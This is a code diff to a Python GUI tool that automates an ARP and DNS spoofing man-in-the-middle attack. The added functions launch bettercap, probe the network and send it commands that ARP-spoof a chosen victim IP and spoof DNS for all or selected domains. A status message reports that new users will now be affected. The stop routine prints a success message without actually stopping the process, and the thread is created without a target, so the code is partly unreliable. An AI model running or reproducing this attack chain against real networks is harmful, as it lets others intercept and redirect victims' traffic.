@@ -44,7 +44,7 @@ def stopDnsSpoofing() :
         errorOutputLabel["text"] += traceback.format_exc()
     except Exception as e:
         errorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
-S
+
 def runDnsSpoofing() :
     global dnsSpoofingThreads, dnsSpoofingIsRunning
     dnsSpoofingIsRunning = True
@@ -73,3 +73,46 @@ def dnsSpoofHub(interface, victimIp, victimDomains):
         time.sleep(2)
     
     terminalLabel["text"] += "\n$ DNS Spoofing Attack executed! New users will now be affected!\n"
+
+def startDnsSpoofingChain(queue, interface, victimIp, victimDomains, terminalContentFrame, errorOutputContentFrame) :
+    terminalLabel = Label(terminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    errorOutputLabel = Label(errorOutputContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    terminalLabel.pack(anchor = NW)
+    errorOutputLabel.pack(anchor = NW)
+
+    spoofTargets = "set arp.spoof.targets " + victimIp
+    spoofDomains = "set dns.spoof.domains " + victimDomains
+
+    dnsSpoofChainProcess = subprocess.Popen(["bettercap", "-iface", interface], 
+                               stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    runBettercapChainThread = threading.Thread(args=(dnsSpoofChainProcess,))
+    runBettercapChainThread.start()
+
+    commands = ["net.probe on", "set arp.spoof.fullduplex true",
+                spoofTargets, "arp.spoof on", "set dns.spoof.all true",
+                spoofDomains, "dns.spoof on"]
+    for command in commands:
+        terminalLabel["text"] += f"\nExecuting command : {command}\n"
+        dnsSpoofChainProcess.stdin.write(f"{command}\n".encode())
+        dnsSpoofChainProcess.stdin.flush()
+
+        # Give it some time to process the command and generate output
+        time.sleep(2)
+    
+    terminalLabel["text"] += "\n$ DNS Spoofing Attack executed! New users will now be affected!\n"
+
+    queue.put((dnsSpoofChainProcess, runBettercapChainThread))
+
+def stopDnsSpoofingChain(chainTerminalContentFrame, chainErrorContentFrame) :
+    chainTerminalLabel = Label(chainTerminalContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainErrorOutputLabel = Label(chainErrorContentFrame, text = "", fg="#ffffff", bg="#252525", font="bahnschrift 8", justify = "left", wraplength=278)
+    chainTerminalLabel.pack(anchor = NW)
+    chainErrorOutputLabel.pack(anchor = NW)
+
+    try:
+        chainTerminalLabel["text"] += "\n$ Stopping DNS Spoofing Attack...\n\n"
+        chainTerminalLabel["text"] += "$ DNS Spoofing Attack successfully stopped!\n"
+    except (AttributeError, RuntimeError):
+        chainErrorOutputLabel["text"] += traceback.format_exc()
+    except Exception as e:
+        chainErrorOutputLabel["text"] += "ERROR : \n" + str(e) + "\n"
